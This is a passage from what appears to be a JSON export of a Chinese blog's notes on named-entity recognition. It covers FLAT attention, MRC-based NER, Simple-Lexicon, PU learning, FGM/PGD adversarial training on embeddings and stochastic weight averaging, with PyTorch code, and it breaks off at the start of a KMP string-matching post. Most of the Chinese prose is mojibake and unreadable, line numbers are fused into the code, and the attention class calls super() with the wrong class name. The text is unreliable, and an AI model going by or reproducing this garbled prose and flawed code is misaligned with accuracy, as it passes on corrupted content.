‡ï¼Œå¹¶ä»å››ä¸ªä¸åŒçš„è§’åº¦æ¥è®¡ç®— å’Œ çš„è·ç¦»ï¼š ä½¿ç”¨\\(A^{*}_{i,j}\\)ä»£æ›¿ tranformer çš„self attention ä¸­çš„ \\(A_{i,j}\\): é€šè¿‡FLATæ¨¡å‹åï¼Œå–å‡ºtokençš„ç¼–ç è¡¨ç¤ºï¼Œå°†å…¶é€å…¥CRFå±‚è¿›è¡Œè§£ç å¾—åˆ°é¢„æµ‹çš„æ ‡ç­¾åºåˆ—ã€‚ è®ºæ–‡ä¸­ç»™å‡ºçš„ç»“æœæ˜¾ç¤ºï¼ŒFLATç›¸è¾ƒäºä¸€ä¼—NERæ¨¡å‹ï¼Œå–å¾—äº†SOTAçš„æ•ˆæœã€‚åŒæ—¶ï¼Œä½¿ç”¨è¾ƒå¤§è§„æ¨¡æ•°æ®æ—¶ï¼Œæ•ˆæœæ›´å¥½ã€‚åœ¨å¯¹æ¯”å®éªŒä¸­å‘ç°ï¼Œå­—ç¬¦ä¸åŒ…å«å®ƒçš„è¯æ±‡ä¹‹é—´çš„å……åˆ†äº¤äº’æ˜¯å¾ˆé‡è¦çš„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class MultiHeadAttention(nn.Module): def __init__(self, hidden_size, num_heads, scaled=True, attn_dropout=None): super(MultiHeadAttentionRel, self).__init__() self.hidden_size = hidden_size self.num_heads = num_heads self.per_head_size = self.hidden_size // self.num_heads self.scaled = scaled assert (self.per_head_size * self.num_heads == self.hidden_size) # æ­£å¸¸ attention çš„ q,k,v å˜æ¢çŸ©é˜µ self.w_k = nn.Linear(self.hidden_size, self.hidden_size) self.w_q = nn.Linear(self.hidden_size, self.hidden_size) self.w_v = nn.Linear(self.hidden_size, self.hidden_size) # è®¡ç®— Rij çš„æƒé‡ self.w_r = nn.Linear(self.hidden_size, self.hidden_size) # è®¡ç®— A* çš„æƒé‡ self.u = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=True) self.v = nn.Parameter(torch.randn(self.num_heads, self.per_head_size), requires_grad=True) self.dropout = nn.Dropout(attn_dropout) def forward(self, key, query, value, pos, flat_mask): \"pos ä¸º è‡ªå®šä¹‰çš„ postion embeddingï¼Œå¯¹åº”å…¬å¼çš„ Rij\" batch = key.size(0) # è¾“å…¥çº¿æ€§å˜æ¢ key = self.w_k(key) query = self.w_q(query) value = self.w_v(value) rel_pos_embedding = self.w_r(pos) ####### è®¡ç®— A* çŸ©é˜µçš„æ–¹æ³• å’Œ è®ºæ–‡ä¸æ˜¯å®Œå…¨ä¸€è‡´ # batch, seq_len, n_head, d_head key = torch.reshape(key, [batch, -1, self.num_heads, self.per_head_size]) query = torch.reshape(query, [batch, -1, self.num_heads, self.per_head_size]) value = torch.reshape(value, [batch, -1, self.num_heads, self.per_head_size]) # batch, seq_len, seq_len, n_head, d_head rel_pos_embedding = torch.reshape(rel_pos_embedding, list(rel_pos_embedding.size()[:3]) + [self.num_heads, self.per_head_size]) # batch, n_head, seq_len, d_head key = key.transpose(1, 2) query = query.transpose(1, 2) value = value.transpose(1, 2) # batch, n_head, d_head, seq_len key = key.transpose(-1, -2) # 1, num_heads, 1, d_head u_for_c = self.u.unsqueeze(0).unsqueeze(-2) # batch, n_head, seq_len, d_head query_and_u_for_c = query + u_for_c # batch, n_head, seq_len, seq_len A_C = torch.matmul(query_and_u_for_c, key) # batch, n_head, seq_len, d_head, seq_len rel_pos_embedding_for_b = rel_pos_embedding.permute(0, 3, 1, 4, 2) # batch, n_head, seq_len, seq_len, 1, d_head query_for_b = query.view([batch, self.num_heads, query.size(2), 1, self.per_head_size]) # batch, n_head, seq_len, seq_len, 1, d_head query_for_b_and_v_for_d = query_for_b + self.v.view(1, self.num_heads, 1, 1, self.per_head_size) # batch, n_head, seq_len, seq_len B_D = torch.matmul(query_for_b_and_v_for_d, rel_pos_embedding_for_b).squeeze(-2) # batch, n_head, seq_len, seq_len attn_score_raw = A_C + B_D # è®¡ç®— score if self.scaled: attn_score_raw = attn_score_raw / math.sqrt(self.per_head_size) mask = 1 - flat_mask.long().unsqueeze(1).unsqueeze(1) attn_score_raw_masked = attn_score_raw.masked_fill(mask.bool(), -1e15) # batch, n_head, seq_len, seq_len attn_score = F.softmax(attn_score_raw_masked, dim=-1) attn_score = self.dropout(attn_score) # batch, n_head, seq_len, d_head value_weighted_sum = torch.matmul(attn_score, value) # batch, seq_len, n_head, d_head -&gt; batch, seq_len, hidden_size result = value_weighted_sum.transpose(1, 2).contiguous().reshape(batch, -1, self.hidden_size) return result BERT æ•™ç¨‹åšå®¢å¾ˆå¤šï¼Œæ¯”å¦‚ http://jalammar.github.io/illustrated-bert/ CRF å‚è€ƒ note1 note2 MRC è®ºæ–‡ï¼šA Unified MRC Framework for Named Entity Recognition Git Repo è½¬æ¢ä¸ºé˜…è¯»ç†è§£ï¼ˆMRCï¼‰ä»»åŠ¡ï¼Œæ¥è§£å†³NERé—®é¢˜ã€‚ä¼¼ä¹æœ‰å¾ˆå¤šæç ”ç©¶çš„ï¼Œéƒ½åœ¨å°è¯•å°†NLPé—®é¢˜è½¬æ¢åˆ°MRCæ¡†æ¶ä¸‹ï¼Œè§£å†³é—®é¢˜ã€‚ ç›®çš„ï¼Œè§£å†³NERä¸­çš„å®ä½“é‡å ã€åµŒå¥—å…³ç³»é—®é¢˜ã€‚è¿™æ˜¯åºåˆ—å»ºæ¨¡æ–¹å¼ï¼Œæ¯”è¾ƒéš¾å¤„ç†çš„é—®é¢˜ã€‚ æ•°æ®ï¼Œå¤„ç†ä¸ºä¸‰å…ƒç»„å½¢å¼ï¼š(é—®é¢˜ï¼Œç­”æ¡ˆï¼Œä¸Šä¸‹æ–‡) å…¶ä¸­ï¼Œé—®é¢˜ï¼šä¸€æ®µå¯¹ å®ä½“ç±»å‹ çš„æè¿°æ–‡å­—ï¼Œå¤šç§å®ä½“ï¼Œå°±æœ‰å¤šä¸ªé—®é¢˜ï¼›ç­”æ¡ˆï¼šä¸º å®ä½“çš„èµ·å§‹ indexï¼›ä¸Šä¸‹æ–‡å°±æ˜¯å¾…è¯†åˆ«çš„æ•´ä¸ªæ–‡æœ¬ã€‚ æ¨¡å‹ï¼Œä½¿ç”¨BERTï¼š æ¯ä¸ªtokené¢„æµ‹è¾“å‡ºæœ‰ä¸¤ä¸ªï¼Œæ˜¯å¦ä¸ºå®ä½“å¼€å§‹å­—ï¼Œæ˜¯å¦ä¸ºå®ä½“ç»“æŸå­—ã€‚ è¾“å‡ºä¸º 2 ç»´ï¼Œæ˜¯å’Œä¸æ˜¯çš„é¢„æµ‹æ¦‚ç‡ã€‚åˆ†åˆ«å¯¹æ¯ä¸ªä½ç½®åˆ¤æ–­ï¼Œæ˜¯å¦ä¸ºå¼€å§‹å­—æˆ–è€…ç»“æŸå­—ã€‚ ä½†æ˜¯è¿™ä¸ªä¸¤ä¸ªé›†åˆï¼Œåœ¨æœ‰ç›‘ç£æ•°æ®æ¡ä»¶ä¸‹ï¼Œå³è®­ç»ƒæ—¶ï¼Œå¹¶æ²¡æœ‰å¿…è¦ï¼Œåªåœ¨é¢„æµ‹æ¨æ–­æ—¶ä½¿ç”¨ï¼ˆæ¨æ–­éœ€è¦é€šè¿‡ä¸‹å¼è®¡ç®—æ‰€æœ‰ç»„åˆçš„æ¦‚ç‡ Pï¼‰ã€‚å› ä¸ºä¸‹å¼ï¼š ç›´æ¥æ ¹æ®æ ‡æ³¨æ•°æ®çš„ i, j å¯¹æ ‡æ³¨éƒ¨åˆ†è®¡ç®— Pã€‚è€Œä¸ç”¨å¯¹æ‰€æœ‰ i, j ç»„åˆç®—ä¸€æ¬¡ Pã€‚ æŸå¤±ï¼Œå¤šä¸ªé¢„æµ‹æŸå¤±ä¹‹å’Œï¼š æƒé‡ä¸ºè¶…å‚æ•°ã€‚ Simple-Lexicon è®ºæ–‡ï¼šSimple-Lexiconï¼šSimplify the Usage of Lexicon in Chinese NER Git Repo åœ¨Embeddingä¿¡æ¯çš„è¾“å…¥ä¸Šè¿›è¡Œæ”¹è¿›ï¼Œå°è¯•äº†å¤šç§æ–¹å¼ã€‚ Softwordï¼šä½¿ç”¨åˆ†è¯å·¥å…·ï¼Œæ ‡è®°è¯çš„ BMESOï¼Œç»“åˆå­—å‘é‡å’Œæ ‡è®°å‘é‡è¾“å…¥ã€‚å­˜åœ¨è¯¯å·®ä¼ æ’­é—®é¢˜ï¼Œæ— æ³•å¼•å…¥ä¸€æ•´ä¸ªè¯æ±‡å¯¹åº”word embedding ExtendSoftwordï¼šç»„åˆæ‰€æœ‰å­—çš„æ‰€æœ‰BMEï¼Œå¾—åˆ°å¯èƒ½çš„è¯ï¼Œä½†æ˜¯æ— æ³•å¤åŸåŸå§‹çš„è¯æ±‡ä¿¡æ¯æ˜¯æ€æ · Soft-lexiconï¼šå¯¹å½“å‰å­—ç¬¦ï¼Œä¾æ¬¡è·å–BMESå¯¹åº”æ‰€æœ‰è¯æ±‡é›†åˆã€‚ æ ¹æ®è¯é¢‘åŠ æƒè¯å‘é‡ï¼Œä¸å­—å‘é‡æ±‚å’Œã€‚ è¯¥æ¨¡å‹æ¯”Lattice LSTM, WC-LSTMç­‰ï¼Œåœ¨è¾“å…¥embeddingä¸Šè¿›è¡Œæ”¹è¿›çš„æ¨¡å‹ï¼Œæ•ˆæœæ›´å¥½ï¼Œæ›´å®¹æ˜“ä½¿ç”¨å’Œè¿ç§»ã€‚ ç­–ç•¥ Positive-unlabeled learning -- PU Learning åœ¨åªæœ‰æ­£ç±»å’Œæ— æ ‡è®°æ•°æ®çš„æƒ…å†µä¸‹ï¼Œè®­ç»ƒäºŒåˆ†ç±»å™¨ Method 1 Directly å°†æ­£æ ·æœ¬å’Œéƒ¨åˆ†ç­›é€‰å‡ºçš„æœªæ ‡è®°æ ·æœ¬åˆ†åˆ«çœ‹ä½œæ˜¯positive sampleså’Œnegative samples è®­ç»ƒä¸€ä¸ªåˆ†ç±»å™¨ï¼Œè¾“å‡ºæ ·æœ¬å±äºæ­£ã€è´Ÿç±»çš„æ¦‚ç‡ ä½¿ç”¨è®­ç»ƒå¥½çš„åˆ†ç±»å™¨ã€‚åˆ†ç±»æœªæ ‡æ³¨æ•°æ®ï¼Œè‹¥æ­£ç±»çš„æ¦‚ç‡ å¤§äº è´Ÿç±»çš„æ¦‚ç‡ï¼Œåˆ™è¯¥æœªæ ‡æ³¨æ ·æœ¬çš„æ›´å¯èƒ½ä¸ºæ­£ç±» Method 2 PU bagging å°†æ‰€æœ‰æ­£æ ·æœ¬å’Œæœªæ ‡è®°æ ·æœ¬è¿›è¡Œéšæœºç»„åˆ bootstrap æ¥åˆ›å»ºè®­ç»ƒé›†ï¼› å°†æ­£æ ·æœ¬å’Œæœªæ ‡è®°æ ·æœ¬è§†ä¸ºpositiveå’Œnegativeï¼Œè®­ç»ƒä¸€ä¸ªåˆ†ç±»å™¨ï¼› å°†åˆ†ç±»å™¨åº”ç”¨äºä¸åœ¨è®­ç»ƒé›†ä¸­çš„æœªæ ‡è®°æ ·æœ¬ OOBï¼ˆâ€œout of bagâ€ï¼‰ï¼Œå¹¶è®°å½•å…¶åˆ†æ•°ï¼› é‡å¤ä¸Šè¿°ä¸‰ä¸ªæ­¥éª¤ï¼Œæœ€åæ¯ä¸ªæœªæ ‡è®°æ ·æœ¬çš„åˆ†æ•°ä¸ºæ¯ä¸€è½® OOBåˆ†æ•° çš„å¹³å‡å€¼ã€‚ Method 3 äººå·¥æ ‡æ³¨ä¸€éƒ¨åˆ†ç¡®è®¤ä¸ºè´Ÿç±»çš„æ•°æ®ï¼Œè®­ç»ƒåˆ†ç±»å™¨è¯†åˆ«è¿™äº› ç¡®è®¤ä¸º è´Ÿç±»çš„æ•°æ®ã€‚ ç¤ºä¾‹ ç¤ºä¾‹ è®ºæ–‡ï¼šDistantly Supervised Named Entity Recognition using Positive-Unlabeled Learningï¼Œå°†PU Learningåº”ç”¨åœ¨NERä»»åŠ¡ä¸Š Git Repoï¼š é¦–å…ˆæœ‰ æœªæ ‡è®°æ•°æ® Duï¼Œå®ä½“å­—å…¸ Dictï¼› ä½¿ç”¨æœ€å¤§åŒ¹é…æ–¹æ³•ï¼Œæ ‡è®°ä¸€éƒ¨åˆ† Duï¼Œæ˜¯NEåˆ™ä¸ºæ­£ç±»ï¼Œä¸æ˜¯NEåˆ™ä¸ºè´Ÿç±»ï¼› å¯¹æ¯ä¸€ç§NEç±»å‹ï¼ˆæ¯”å¦‚ï¼ŒLocï¼ŒNaneï¼‰è®­ç»ƒä¸€ä¸ªPU åˆ†ç±»å™¨ï¼ˆè‡ªå®šä¹‰çš„ç¥ç»ç½‘ç»œæ¨¡å‹ï¼‰ï¼› ä½¿ç”¨å¤šä¸ªPU åˆ†ç±»å™¨ï¼Œå¯¹å‰©ä½™çš„ Duï¼Œè¿›è¡Œé¢„æµ‹ï¼Œæ¯ä¸€ä¸ªè¯ï¼Œå–é¢„æµ‹æ¦‚ç‡æœ€å¤§çš„é‚£ä¸€ç±»æ ‡è®°ï¼› è‹¥æŸäº› è¯ å¤šæ¬¡è¢«é¢„æµ‹ä¸º å®ä½“ï¼Œä¸”æ¯æ¬¡å‡ºç°éƒ½è¢«é¢„æµ‹ä¸ºåŒä¸€ç±»å®ä½“ï¼Œé‚£ä¹ˆï¼Œå°†è¿™ä¸ªè¯ï¼ŒåŠ å…¥Dictï¼› é‡å¤ä»¥ä¸Šæ­¥éª¤ï¼Œç›´åˆ°Dictä¸å†æ”¹å˜ã€‚ FGM å¼•ç”¨BlogåŸæ–‡ å¯¹æŠ—å¯ä»¥ä½œä¸ºä¸€ç§é˜²å¾¡æœºåˆ¶ï¼Œå¹¶ä¸”ç»è¿‡ç®€å•çš„ä¿®æ”¹ï¼Œä¾¿èƒ½ç”¨åœ¨NLPä»»åŠ¡ä¸Šï¼Œæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚å¯¹æŠ—è®­ç»ƒå¯ä»¥å†™æˆä¸€ä¸ªæ’ä»¶çš„å½¢å¼ï¼Œç”¨å‡ è¡Œä»£ç å°±å¯ä»¥åœ¨è®­ç»ƒä¸­è‡ªç”±åœ°è°ƒç”¨ã€‚ åœ¨åŸå§‹è¾“å…¥æ ·æœ¬ ä¸ŠåŠ ä¸€ä¸ªæ‰°åŠ¨ ï¼Œå¾—åˆ°å¯¹æŠ—æ ·æœ¬åï¼Œç”¨å…¶è¿›è¡Œè®­ç»ƒã€‚å°†è¾“å…¥æ ·æœ¬å‘ç€æŸå¤±ä¸Šå‡çš„æ–¹å‘å†è¿›ä¸€æ­¥ï¼Œå¾—åˆ°çš„å¯¹æŠ—æ ·æœ¬å°±èƒ½é€ æˆæ›´å¤§çš„æŸå¤±ï¼Œæé«˜æ¨¡å‹çš„é”™è¯¯ç‡ã€‚é—®é¢˜å¯ä»¥è¢«æŠ½è±¡æˆè¿™ä¹ˆä¸€ä¸ªæ¨¡å‹ï¼š å…¶ä¸­ï¼Œ ä¸ºgold labelï¼Œ ä¸ºæ¨¡å‹å‚æ•°ã€‚Goodfellowè®¤ä¸ºï¼Œç¥ç»ç½‘ç»œç”±äºå…¶çº¿æ€§çš„ç‰¹ç‚¹ï¼Œå¾ˆå®¹æ˜“å—åˆ°çº¿æ€§æ‰°åŠ¨çš„æ”»å‡»ã€‚äºæ˜¯ï¼Œä»–æå‡ºäº† Fast Gradient Sign Method (FGSM) ï¼š å…¶ä¸­ï¼Œ ä¸ºç¬¦å·å‡½æ•°ï¼Œ ä¸ºæŸå¤±å‡½æ•°ã€‚Goodfellowå‘ç°ï¼Œä»¤ ï¼Œç”¨è¿™ä¸ªæ‰°åŠ¨èƒ½ç»™ä¸€ä¸ªå•å±‚åˆ†ç±»å™¨é€ æˆ99.9%çš„é”™è¯¯ç‡ã€‚ Goodfellowè¿˜æ€»ç»“äº†å¯¹æŠ—è®­ç»ƒçš„ä¸¤ä¸ªä½œç”¨ï¼š æé«˜æ¨¡å‹åº”å¯¹æ¶æ„å¯¹æŠ—æ ·æœ¬æ—¶çš„é²æ£’æ€§ï¼› ä½œä¸ºä¸€ç§regularizationï¼Œå‡å°‘overfittingï¼Œæé«˜æ³›åŒ–èƒ½åŠ›ã€‚ ä»ä¼˜åŒ–çš„è§†è§’ï¼Œé—®é¢˜é‡æ–°å®šä¹‰æˆäº†ä¸€ä¸ªæ‰¾éç‚¹çš„é—®é¢˜ï¼ŒMin-Maxï¼šå†…éƒ¨æŸå¤±å‡½æ•°çš„æœ€å¤§åŒ–ï¼Œå¤–éƒ¨ç»éªŒé£é™©çš„æœ€å°åŒ–ï¼š å†…éƒ¨maxæ˜¯ä¸ºäº†æ‰¾åˆ°worst-caseçš„æ‰°åŠ¨ï¼Œä¹Ÿå°±æ˜¯æ”»å‡»ï¼Œå…¶ä¸­ï¼Œ ä¸ºæŸå¤±å‡½æ•°ï¼Œ ä¸ºæ‰°åŠ¨çš„èŒƒå›´ç©ºé—´ã€‚ å¤–éƒ¨minæ˜¯ä¸ºäº†åŸºäºè¯¥æ”»å‡»æ–¹å¼ï¼Œæ‰¾åˆ°æœ€é²æ£’çš„æ¨¡å‹å‚æ•°ï¼Œä¹Ÿå°±æ˜¯é˜²å¾¡ï¼Œå…¶ä¸­ æ˜¯è¾“å…¥æ ·æœ¬çš„åˆ†å¸ƒã€‚ CVä»»åŠ¡çš„è¾“å…¥æ˜¯è¿ç»­çš„RGBçš„å€¼ï¼Œè€ŒNLPé—®é¢˜ä¸­ï¼Œè¾“å…¥æ˜¯ç¦»æ•£çš„å•è¯åºåˆ—ï¼Œä¸€èˆ¬ä»¥one-hot vectorçš„å½¢å¼å‘ˆç°ï¼Œå¦‚æœç›´æ¥åœ¨raw textä¸Šè¿›è¡Œæ‰°åŠ¨ï¼Œé‚£ä¹ˆæ‰°åŠ¨çš„å¤§å°å’Œæ–¹å‘å¯èƒ½éƒ½æ²¡ä»€ä¹ˆæ„ä¹‰ã€‚Goodfellowåœ¨17å¹´çš„ICLRä¸­æå‡ºäº†å¯ä»¥åœ¨è¿ç»­çš„embeddingä¸Šåšæ‰°åŠ¨ã€‚åœ¨CVä»»åŠ¡ï¼Œæ ¹æ®ç»éªŒæ€§çš„ç»“è®ºï¼Œå¯¹æŠ—è®­ç»ƒå¾€å¾€ä¼šä½¿å¾—æ¨¡å‹åœ¨éå¯¹æŠ—æ ·æœ¬ä¸Šçš„è¡¨ç°å˜å·®ï¼Œç„¶è€Œç¥å¥‡çš„æ˜¯ï¼Œåœ¨NLPä»»åŠ¡ä¸­ï¼Œæ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›åè€Œå˜å¼ºäº†ã€‚ å› æ­¤ï¼Œåœ¨NLPä»»åŠ¡ä¸­ï¼Œå¯¹æŠ—è®­ç»ƒçš„è§’è‰²ä¸å†æ˜¯ä¸ºäº†é˜²å¾¡åŸºäºæ¢¯åº¦çš„æ¶æ„æ”»å‡»ï¼Œåè€Œæ›´å¤šçš„æ˜¯ä½œä¸ºä¸€ç§regularizationï¼Œæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚ å¯¹æŠ—è®­ç»ƒï¼ŒFSGMçš„ä¿®æ”¹ç‰ˆæœ¬ï¼Œå–æ¶ˆäº†ç¬¦å·å‡½æ•°ï¼Œå¯¹æ¢¯åº¦è®¡ç®—è¿›è¡Œscaleï¼Œè€Œä¸æ˜¯åªä½¿ç”¨ +1 æˆ–è€… -1 ä»£æ›¿ã€‚ åŸç½‘ç»œè¿›è¡Œä¸€æ¬¡ï¼Œå‰å‘åå‘ä¼ æ’­ï¼Œå¾—åˆ°æ¢¯åº¦g è®¡ç®—embeddingçŸ©é˜µçš„ä¿®æ­£æ¢¯åº¦ r: \\(r=\\frac{\\epsilon g}{\\|g\\|_{2}}\\) è¾“å…¥ embedding + r ï¼Œè®¡ç®—å¯¹æŠ—æ¢¯åº¦ ga å°† ga ç´¯åŠ åˆ° g ä¸­ï¼Œå¾—åˆ° gf æ¢å¤åŸç½‘ç»œçš„embeddingæ•°å€¼ï¼Œä½¿ç”¨ gf å¯¹å‚æ•°è¿›è¡Œæ›´æ–° Projected Gradient Descentï¼ˆPGDï¼‰ï¼šâ€œå°æ­¥èµ°ï¼Œå¤šèµ°å‡ æ­¥â€ï¼Œå¦‚æœèµ°å‡ºäº†æ‰°åŠ¨åŠå¾„ä¸º çš„ç©ºé—´ï¼Œå°±æ˜ å°„å›â€œçƒé¢â€ä¸Šï¼Œä»¥ä¿è¯æ‰°åŠ¨ä¸è¦è¿‡å¤§ã€‚ å…¶ä¸­ ä¸ºæ‰°åŠ¨çš„çº¦æŸç©ºé—´ï¼Œ ä¸ºå°æ­¥çš„æ­¥é•¿ã€‚ PGDæ¨¡å‹èƒ½å¤Ÿå¾—åˆ°ä¸€ä¸ªéå¸¸ä½ä¸”é›†ä¸­çš„lossåˆ†å¸ƒã€‚ å¦å¤–åœ¨åŠç›‘ç£æ¡ä»¶ä¸‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¯¹æŠ—è®­ç»ƒæ–¹æ³•Virtual Adversarial Trainingè¿›è¡ŒåŠç›‘ç£è®­ç»ƒã€‚ ç¤ºä¾‹ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import torchgrad_backup = &#123;&#125;def save_grad(tensorName): def backward_hook(grad: torch.Tensor): grad_backup[tensorName] = grad return backward_hookclass PGD: def __init__(self, model): self.model = model self.emb_backup = &#123;&#125; def attack(self, epsilon=1., alpha=0.3, emb_name='emb.', is_first_attack=False): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: if is_first_attack: self.emb_backup[name] = param.data.clone() norm = torch.norm(param.grad) if norm != 0 and not torch.isnan(norm): r_at = alpha * param.grad / norm param.data.add_(r_at) param.data = self.project(name, param.data, epsilon) def restore(self, emb_name='emb.'): # emb_nameè¿™ä¸ªå‚æ•°è¦æ¢æˆä½ æ¨¡å‹ä¸­embeddingçš„å‚æ•°å for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: assert name in self.emb_backup param.data = self.emb_backup[name] self.emb_backup = &#123;&#125; def project(self, param_name, param_data, epsilon): r = param_data - self.emb_backup[param_name] if torch.norm(r) &gt; epsilon: r = epsilon * r / torch.norm(r) return self.emb_backup[param_name] + r def backup_grad(self): # æ­¤å¤„ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä¸€ä¸ªæˆå‘˜å˜é‡å‚¨å­˜ gradï¼Œè€Œä¸ç”¨ register_hook å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ for name, param in self.model.named_parameters(): if param.requires_grad: param.register_hook(save_grad(name)) def restore_grad(self): for name, param in self.model.named_parameters(): if param.requires_grad: param.grad = grad_backup[name]if __name__ == '__main__': # ç¤ºä¾‹è¿‡ç¨‹ pgd = PGD(model) K = 3 # å°æ­¥èµ°çš„æ­¥æ•° for batch_input, batch_label in data: # æ­£å¸¸è®­ç»ƒ loss = model(batch_input, batch_label) loss.backward() # åå‘ä¼ æ’­ï¼Œå¾—åˆ°æ­£å¸¸çš„grad pgd.backup_grad() # å¯¹æŠ—è®­ç»ƒ for t in range(K): pgd.attack(is_first_attack=(t==0)) # åœ¨embeddingä¸Šæ·»åŠ å¯¹æŠ—æ‰°åŠ¨, first attackæ—¶å¤‡ä»½param.data if t != K-1: model.zero_grad() else: pgd.restore_grad() loss_adv = model(batch_input, batch_label) loss_adv.backward() # åå‘ä¼ æ’­ï¼Œå¹¶åœ¨æ­£å¸¸çš„gradåŸºç¡€ä¸Šï¼Œç´¯åŠ å¯¹æŠ—è®­ç»ƒçš„æ¢¯åº¦ pgd.restore() # æ¢å¤embeddingå‚æ•° # æ¢¯åº¦ä¸‹é™ï¼Œæ›´æ–°å‚æ•° optimizer.step() model.zero_grad() 12345678910111213141516171819202122232425262728293031323334353637383940import torchclass FGM: def __init__(self, model): self.model = model self.backup = &#123;&#125; def attack(self, epsilon=1, emb_name='emb.'): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: self.backup[name] = param.data.clone() norm = torch.norm(param.grad) if norm != 0 and not torch.isnan(norm): r_adv = epsilon * param.grad / norm param.data.add_(r_adv) def restore(self, emb_name='emb.'): for name, param in self.model.named_parameters(): if param.requires_grad and emb_name in name: assert name in self.backup param.data = self.backup[name] self.backup = &#123;&#125;if __name__ == \"__main__\": # ç¤ºä¾‹è¿‡ç¨‹ fgm = FGM(model) for batch_input, batch_label in data: # æ­£å¸¸è®­ç»ƒ loss = model(batch_input, batch_label) loss.backward() # åå‘ä¼ æ’­ï¼Œå¾—åˆ°æ­£å¸¸çš„grad # å¯¹æŠ—è®­ç»ƒ fgm.attack() # åœ¨embeddingä¸Šæ·»åŠ å¯¹æŠ—æ‰°åŠ¨ loss_adv = model(batch_input, batch_label) loss_adv.backward() # åå‘ä¼ æ’­ï¼Œå¹¶åœ¨æ­£å¸¸çš„gradåŸºç¡€ä¸Šï¼Œç´¯åŠ å¯¹æŠ—è®­ç»ƒçš„æ¢¯åº¦ fgm.restore() # æ¢å¤embeddingå‚æ•° # æ¢¯åº¦ä¸‹é™ï¼Œæ›´æ–°å‚æ•° optimizer.step() model.zero_grad() SWA Stochastic Weight Averagingï¼Œæ–¹æ³•çš„æå‡ºè€…è®¤ä¸ºï¼Œè®­ç»ƒæœŸé—´å¾—åˆ°çš„å±€éƒ¨æœ€å°å€¼ å€¾å‘äº åœ¨æŸå¤±å€¼è¾ƒä½çš„åŒºåŸŸçš„è¾¹ç•Œï¼Œè€Œä¸æ˜¯é›†ä¸­åœ¨æŸå¤±æ›´ä½çš„åŒºåŸŸä¸­å¿ƒéƒ¨åˆ†ã€‚æ‰€ä»¥ï¼ŒStochastic Weight Averagingå¯ä»¥é€šè¿‡å¯¹è¾¹ç•Œçš„å¹³å‡ï¼Œå¾—åˆ°æ›´å¥½æ€§èƒ½å’Œæ›´å¥½æ³›åŒ–æ€§èƒ½çš„æ¨¡å‹ã€‚Git Repo ä¿å­˜ä¸¤å¥—æƒé‡w, wswaï¼› ä½¿ç”¨å¾ªç¯å­¦ä¹ ç‡ï¼Œè®­ç»ƒwï¼› è¾¾åˆ°æŒ‡å®šè½®æ¬¡ï¼Œæ›´æ–°wsï¼Œ\\(n_{models}\\)æŒ‡æ›´æ–°\\(w_{swa}\\)æ—¶ï¼Œä¸­é—´é—´éš”çš„è½®æ¬¡: \\(w_{swa} = \\frac{w_{swa}n_{models}+w}{n_{models}+1}\\) å¾ªç¯ä»¥ä¸Šæ­¥éª¤ï¼Œæœ€åä½¿ç”¨wswaï¼Œä½œä¸ºæœ€ç»ˆæ¨¡å‹ æœ‰å¯ä»¥ç›´æ¥ä½¿ç”¨çš„å·¥å…·ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚~from torchcontrib.optim import SWA~ 12345678910111213141516optimizer = torch.optim.Adam(params_lr)# Stochastic Weight Averagingoptimizer = SWA(optimizer)if ...: optimizer.update_swa() ...# è®­ç»ƒç»“æŸæ—¶ä½¿ç”¨æ”¶é›†åˆ°çš„swa moving averageoptimizer.swap_swa_sgd()# optimizer.bn_update(# train_dataloader,# model) # æ›´æ–°BatchNormçš„ running mean# save å‚è€ƒé“¾æ¥ï¼š 2020CCF-NER Flat-Lattice-Transformer","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"FLAT","slug":"FLAT","permalink":"https://racleray.github.io/tags/FLAT/"},{"name":"methodology","slug":"methodology","permalink":"https://racleray.github.io/tags/methodology/"}]},{"title":"å­—ç¬¦ä¸²åŒ¹é…ä»KMPåˆ°ACè‡ªåŠ¨æœº","slug":"å­—ç¬¦ä¸²åŒ¹é…ä»KMPåˆ°ACè‡ªåŠ¨æœº","date":"2021-02-27T15:21:03.000Z","updated":"2023-08-07T11:54:31.040Z","comments":true,"path":"posts/51024bbf.html","link":"","permalink":"https://racleray.github.io/posts/51024bbf.html","excerpt":"è®°å½•ä»å¤šè¾“å…¥å•patternæ–‡æœ¬åŒ¹é…ç®—æ³•KMPï¼Œåˆ°å¤šè¾“å…¥å¤špatternæ–‡æœ¬åŒ¹é…ç®—æ³•ACè‡ªåŠ¨æœºã€‚","text":"Knuth-Morris-Pratt åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²Så†…æŸ¥æ‰¾ä¸€ä¸ªè¯Wçš„å‡ºç°ä½ç½®ã€‚KMPç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿæ¯”å¦‚æ˜¯æš´åŠ›åŒ¹é…ï¼ˆä¸¤ä¸ªforå¾ªç¯ï¼‰æœ€åçš„æƒ…å†µï¼ŒO(m*n)ï¼š 12S: aaaaaaaaaaaaaaW: aaab æƒ³æ³•ï¼Œä¸åŒ¹é…å°±åªæ˜¯ä¸ªç»“æœï¼Œæ²¡æœ‰å…¶å®ƒä¿¡æ¯äº§ç”Ÿå—ï¼Ÿæ˜¾ç„¶ï¼Œå¦‚æœæœ‰ä¸€éƒ¨åˆ†åŒ¹é…ï¼Œåç»­æœç´¢åº”è¯¥å¯ä»¥åˆ©ç”¨ã€‚ æ€ä¹ˆåˆ©ç”¨ï¼Ÿ 